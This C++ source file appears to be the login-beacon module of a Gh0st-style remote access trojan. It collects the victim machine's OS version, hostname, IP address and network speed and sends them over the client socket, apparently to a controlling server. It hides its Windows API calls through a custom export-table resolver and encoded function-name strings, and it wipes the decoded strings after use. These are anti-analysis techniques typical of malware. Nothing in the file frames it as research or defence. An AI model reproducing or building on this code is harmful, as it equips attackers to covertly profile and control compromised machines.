
#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>
#include "decode.h"
#include "until.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")
typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	//int				CPUClockMhz;	// CPU主频
	IN_ADDR			IPAddress;		// 存储32位的IPv4的地址数据结构
	char			HostName[50];	// 主机名
	//bool			bIsWebCam;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
}LOGININFO;


DWORD mySelfGetProcAddress(
	HMODULE hModule, // handle to DLL module
	LPCSTR lpProcName // function name
)
{
	int i = 0;
	char* pRet = NULL;
	PIMAGE_DOS_HEADER pImageDosHeader = NULL;
	PIMAGE_NT_HEADERS pImageNtHeader = NULL;
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

	pImageDosHeader = (PIMAGE_DOS_HEADER)hModule;
	pImageNtHeader = (PIMAGE_NT_HEADERS)((DWORD)hModule + pImageDosHeader->e_lfanew);
	pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hModule + pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD dwExportRVA = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	DWORD dwExportSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	DWORD* pAddressOfFunction = (DWORD*)(pImageExportDirectory->AddressOfFunctions + (DWORD)hModule);
	DWORD* pAddressOfNames = (DWORD*)(pImageExportDirectory->AddressOfNames + (DWORD)hModule);
	DWORD dwNumberOfNames = (DWORD)(pImageExportDirectory->NumberOfNames);
	DWORD dwBase = (DWORD)(pImageExportDirectory->Base);

	WORD* pAddressOfNameOrdinals = (WORD*)(pImageExportDirectory->AddressOfNameOrdinals + (DWORD)hModule);

	//这个是查一下是按照什么方式（函数名称or函数序号）来查函数地址的

	for (i = 0; i < (int)dwNumberOfNames; i++)
	{
		char* strFunction = (char*)(pAddressOfNames[i] + (DWORD)hModule);
		if (strcmp(strFunction, lpProcName) == 0)
		{
			pRet = (char*)(pAddressOfFunction[pAddressOfNameOrdinals[i]] + (DWORD)hModule);
			break;
		}
	}
	//判断得到的地址有没有越界
	if ((DWORD)pRet<dwExportRVA + (DWORD)hModule || (DWORD)pRet > dwExportRVA + (DWORD)hModule + dwExportSize)
	{
		if (*((WORD*)pRet) == 0xFF8B)
		{
			return (DWORD)pRet + 2;
		}
		return (DWORD)pRet;
	}
}

int sendLoginInfo(privatra*pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;
	// 登录信息
	LOGININFO	LoginInfo;
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
	//LoginInfo.bIsWebCam = 0; //没有摄像头
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	
	typedef HMODULE(WINAPI* myLoadLibraryA)(
		_In_ LPCSTR lpLibFileName
		);
	char krn[] = { 0x08,0x80, 0x8f, 0x9b, 0x86, 0x82, 0x8a, 0xf6, 0xf6 };
	char* pkrn = decodeStr(krn);
	char loadlb[] = { 0x0c,0x87,0xa5,0xa8,0xac,0x8b,0xaf,0xa7,0xb6,0xa2,0xb0,0xb8,0x81 };
	char* ploadlb = decodeStr(loadlb);
	myLoadLibraryA myLoadLibraryfunc = (myLoadLibraryA)mySelfGetProcAddress(GetModuleHandle(pkrn), ploadlb);
	memset(pkrn, 0, krn[STR_CRY_LENGTH]);					//填充0
	delete pkrn;
	memset(ploadlb, 0, loadlb[STR_CRY_LENGTH]);					//填充0
	delete ploadlb;

	char ws2str[] = { 0x0a,0xbc,0xb9,0xfb,0x97,0xf4,0xf4,0xeb,0xa0,0xaf,0xae };
	char* pws2str = decodeStr(ws2str);
	HMODULE ws2 = myLoadLibraryfunc(pws2str);
	char gethostbyna[] = { 0x0b,0xac,0xaf,0xbd,0xa0,0xa8,0xb5,0xb1,0xaa,0xa2,0xaf,0xa4 };
	char* pgethostbyna = decodeStr(gethostbyna);
	typedef int (WINAPI* mygethostname)(
		_Out_writes_bytes_(namelen) char FAR* name,
		_In_ int namelen
	);
	mygethostname mygethostnamefunc = (mygethostname)mySelfGetProcAddress(ws2, pgethostbyna);
	// 主机名
	char hostname[256] = {0};
	mygethostnamefunc(hostname, 256);
	memset(pgethostbyna, 0, gethostbyna[STR_CRY_LENGTH]);					//填充0
	delete pgethostbyna;
	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);

	char getsocknamestr[] = { 0x0b,0xac,0xaf,0xbd,0xbb,0xa8,0xa5,0xae,0xaa,0xa2,0xaf,0xa4 };
	char* pgetsocknamestr = decodeStr(getsocknamestr);
	typedef int(WINAPI* mygetsockname)(
		_In_ SOCKET s,
		_Out_writes_bytes_to_(*namelen, *namelen) struct sockaddr FAR* name,
		_Inout_ int FAR* namelen
	);
	mygetsockname mygetsocknamefunc = (mygetsockname)mySelfGetProcAddress(ws2, pgetsocknamestr);
	memset(pgetsocknamestr, 0, getsocknamestr[STR_CRY_LENGTH]);					//填充0
	delete pgetsocknamestr;

	mygetsocknamefunc(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	GetVersionEx((OSVERSIONINFO*)&LoginInfo.OsVerInfoEx); // 注意转换类型
	// IP信息
	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));

	// Speed
	LoginInfo.dwSpeed = dwSpeed;

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}
